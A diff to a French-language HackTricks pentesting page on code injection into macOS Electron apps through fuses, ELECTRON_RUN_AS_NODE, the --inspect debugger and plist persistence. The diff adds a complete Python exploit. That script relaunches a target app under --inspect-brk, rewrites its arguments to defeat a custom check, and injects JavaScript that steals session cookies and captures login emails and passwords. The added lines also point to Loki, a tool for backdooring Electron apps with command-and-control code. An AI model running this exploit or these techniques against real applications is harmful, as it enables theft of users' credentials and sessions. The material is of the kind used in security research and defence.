@@ -1,8 +1,8 @@
-# Injection d'applications Electron sur macOS
+# macOS Injection d'Applications Electron
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Informations de base
+## Informations de Base
 
 Si vous ne savez pas ce qu'est Electron, vous pouvez trouver [**beaucoup d'informations ici**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Mais pour l'instant, sachez simplement qu'Electron exécute **node**.\
 Et node a certains **paramètres** et **variables d'environnement** qui peuvent être utilisés pour **exécuter d'autres codes** en plus du fichier indiqué.
@@ -14,7 +14,7 @@ Ces techniques seront discutées ensuite, mais récemment, Electron a ajouté pl
 - **`RunAsNode`** : S'il est désactivé, il empêche l'utilisation de la variable d'environnement **`ELECTRON_RUN_AS_NODE`** pour injecter du code.
 - **`EnableNodeCliInspectArguments`** : S'il est désactivé, des paramètres comme `--inspect`, `--inspect-brk` ne seront pas respectés. Évitant ainsi cette méthode pour injecter du code.
 - **`EnableEmbeddedAsarIntegrityValidation`** : S'il est activé, le **fichier** **`asar`** chargé sera **validé** par macOS. **Prévenant** ainsi **l'injection de code** en modifiant le contenu de ce fichier.
-- **`OnlyLoadAppFromAsar`** : S'il est activé, au lieu de chercher à charger dans l'ordre suivant : **`app.asar`**, **`app`** et enfin **`default_app.asar`**. Il ne vérifiera et n'utilisera que app.asar, garantissant ainsi que lorsqu'il est **combiné** avec le fusible **`embeddedAsarIntegrityValidation`**, il est **impossible** de **charger du code non validé**.
+- **`OnlyLoadAppFromAsar`** : Si cela est activé, au lieu de chercher à charger dans l'ordre suivant : **`app.asar`**, **`app`** et enfin **`default_app.asar`**. Il ne vérifiera et n'utilisera que app.asar, garantissant ainsi que lorsqu'il est **combiné** avec le fusible **`embeddedAsarIntegrityValidation`**, il est **impossible** de **charger du code non validé**.
 - **`LoadBrowserProcessSpecificV8Snapshot`** : S'il est activé, le processus du navigateur utilise le fichier appelé `browser_v8_context_snapshot.bin` pour son instantané V8.
 
 Un autre fusible intéressant qui ne préviendra pas l'injection de code est :
@@ -23,7 +23,7 @@ Un autre fusible intéressant qui ne préviendra pas l'injection de code est :
 
 ### Vérification des Fusibles Electron
 
-Vous pouvez **vérifier ces drapeaux** à partir d'une application avec :
+Vous pouvez **vérifier ces drapeaux** depuis une application avec :
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -37,9 +37,9 @@ EnableEmbeddedAsarIntegrityValidation is Enabled
 OnlyLoadAppFromAsar is Enabled
 LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-### Modification des Fusions Electron
+### Modification des Fuses Electron
 
-Comme le [**mentionnent les docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuration des **Fusions Electron** est configurée à l'intérieur du **binaire Electron** qui contient quelque part la chaîne **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+Comme le [**mentionnent les docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuration des **Fuses Electron** est configurée à l'intérieur du **binaire Electron** qui contient quelque part la chaîne **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
 Dans les applications macOS, cela se trouve généralement dans `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
@@ -50,7 +50,7 @@ Vous pouvez charger ce fichier dans [https://hexed.it/](https://hexed.it/) et re
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Notez que si vous essayez de **surcharger** le **binaire `Electron Framework`** à l'intérieur d'une application avec ces octets modifiés, l'application ne fonctionnera pas.
+Notez que si vous essayez de **surcharger** le binaire **`Electron Framework`** à l'intérieur d'une application avec ces octets modifiés, l'application ne fonctionnera pas.
 
 ## RCE ajout de code aux applications Electron
 
@@ -74,7 +74,7 @@ Et emballez-le à nouveau après l'avoir modifié avec :
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-## RCE avec `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+## RCE avec ELECTRON_RUN_AS_NODE
 
 Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), si cette variable d'environnement est définie, elle démarrera le processus en tant que processus Node.js normal.
 ```bash
@@ -154,6 +154,214 @@ Par exemple :
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
+Dans [**cet article de blog**](https://hackerone.com/reports/1274695), ce débogage est abusé pour faire en sorte qu'un chrome sans tête **télécharge des fichiers arbitraires à des emplacements arbitraires**.
+
+> [!TIP]
+> Si une application a sa propre méthode pour vérifier si des variables d'environnement ou des paramètres tels que `--inspect` sont définis, vous pourriez essayer de **contourner** cela en temps réel en utilisant l'argument `--inspect-brk` qui **arrêtera l'exécution** au début de l'application et exécutera un contournement (en écrasant les arguments ou les variables d'environnement du processus actuel par exemple).
+
+L'exploit suivant consistait à surveiller et à exécuter l'application avec le paramètre `--inspect-brk`, ce qui a permis de contourner la protection personnalisée qu'elle avait (en écrasant les paramètres du processus pour supprimer `--inspect-brk`) et ensuite d'injecter une charge utile JS pour extraire des cookies et des identifiants de l'application :
+```python
+import asyncio
+import websockets
+import json
+import requests
+import os
+import psutil
+from time import sleep
+
+INSPECT_URL = None
+CONT = 0
+CONTEXT_ID = None
+NAME = None
+UNIQUE_ID = None
+
+JS_PAYLOADS = """
+var { webContents } = require('electron');
+var fs = require('fs');
+
+var wc = webContents.getAllWebContents()[0]
+
+
+function writeToFile(filePath, content) {
+const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
+
+fs.writeFile(filePath, data, (err) => {
+if (err) {
+console.error(`Error writing to file ${filePath}:`, err);
+} else {
+console.log(`File written successfully at ${filePath}`);
+}
+});
+}
+
+function get_cookies() {
+intervalIdCookies = setInterval(() => {
+console.log("Checking cookies...");
+wc.session.cookies.get({})
+.then((cookies) => {
+tokenCookie = cookies.find(cookie => cookie.name === "token");
+if (tokenCookie){
+writeToFile("/tmp/cookies.txt", cookies);
+clearInterval(intervalIdCookies);
+wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
+}
+})
+}, 1000);
+}
+
+function get_creds() {
+in_location = false;
+intervalIdCreds = setInterval(() => {
+if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
+in_location = true;
+console.log("Injecting creds logger...");
+wc.executeJavaScript(`
+(function() {
+email = document.getElementById('login_email_id');
+password = document.getElementById('login_password_id');
+if (password && email) {
+return email.value+":"+password.value;
+}
+})();
+`).then(result => {
+writeToFile("/tmp/victim_credentials.txt", result);
+})
+}
+else if (in_location) {
+wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
+clearInterval(intervalIdCreds);
+}
+}, 10); // Check every 10ms
+setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
+}
+
+get_cookies();
+get_creds();
+console.log("Payloads injected");
+"""
+
+async def get_debugger_url():
+"""
+Fetch the local inspector's WebSocket URL from the JSON endpoint.
+Assumes there's exactly one debug target.
+"""
+global INSPECT_URL
+
+url = "http://127.0.0.1:9229/json"
+response = requests.get(url)
+data = response.json()
+if not data:
+raise RuntimeError("No debug targets found on port 9229.")
+# data[0] should contain an object with "webSocketDebuggerUrl"
+ws_url = data[0].get("webSocketDebuggerUrl")
+if not ws_url:
+raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
+INSPECT_URL = ws_url
+
+
+async def monitor_victim():
+print("Monitoring victim process...")
+found = False
+while not found:
+sleep(1)  # Check every second
+for process in psutil.process_iter(attrs=['pid', 'name']):
+try:
+# Check if the process name contains "victim"
+if process.info['name'] and 'victim' in process.info['name']:
+found = True
+print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
+os.kill(process.info['pid'], 9)  # Force kill the process
+except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+# Handle processes that might have terminated or are inaccessible
+pass
+os.system("open /Applications/victim.app --args --inspect-brk")
+
+async def bypass_protections():
+global CONTEXT_ID, NAME, UNIQUE_ID
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+
+sleep(1)
+
+await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})
+
+await send_cmd(ws, "Profiler.enable")
+
+await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})
+
+await send_cmd(ws, "Runtime.runIfWaitingForDebugger")
+
+await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})
+
+code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
+print("Injected code to bypass protections")
+
+
+async def js_payloads():
+global CONT, CONTEXT_ID, NAME, UNIQUE_ID
+
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})
+
+
+
+async def main():
+await monitor_victim()
+sleep(3)
+await get_debugger_url()
+await bypass_protections()
+
+sleep(7)
+
+await js_payloads()
+
+
+
+async def send_cmd(ws, method, get_first=False, params={}):
+"""
+Send a command to the inspector and read until we get a response with matching "id".
+"""
+global CONT
+
+CONT += 1
+
+# Send the command
+await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
+sleep(0.4)
+
+# Read messages until we get our command result
+while True:
+response = await ws.recv()
+data = json.loads(response)
+
+# Print for debugging
+print(f"[{method} / {CONT}] ->", data)
+
+if get_first:
+return data
+
+# If this message is a response to our command (by matching "id"), break
+if data.get("id") == CONT:
+return data
+
+# Otherwise it's an event or unrelated message; keep reading
+
+if __name__ == "__main__":
+asyncio.run(main())
+```
 > [!CAUTION]
 > Si le fusible **`EnableNodeCliInspectArguments`** est désactivé, l'application **ignorera les paramètres node** (comme `--inspect`) lors du lancement, à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie, qui sera également **ignorée** si le fusible **`RunAsNode`** est désactivé.
 >
@@ -169,8 +377,6 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-Dans [**ce billet de blog**](https://hackerone.com/reports/1274695), ce débogage est abusé pour faire en sorte qu'un chrome sans tête **télécharge des fichiers arbitraires à des emplacements arbitraires**.
-
 ### Injection depuis le Plist de l'App
 
 Vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
@@ -198,6 +404,8 @@ Les techniques précédentes vous permettront d'exécuter **du code JS à l'int�
 Par conséquent, si vous souhaitez abuser des droits pour accéder à la caméra ou au microphone par exemple, vous pourriez simplement **exécuter un autre binaire depuis le processus**.
 
 ## Injection automatique
+
+- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
 
 L'outil [**electroniz3r**](https://github.com/r3ggi/electroniz3r) peut être facilement utilisé pour **trouver des applications electron vulnérables** installées et y injecter du code. Cet outil essaiera d'utiliser la technique **`--inspect`** :
 
@@ -237,6 +445,11 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
+- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
+
+Loki a été conçu pour créer des portes dérobées dans les applications Electron en remplaçant les fichiers JavaScript des applications par les fichiers JavaScript de commande et de contrôle de Loki.
+
+
 ## Références
 
 - [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
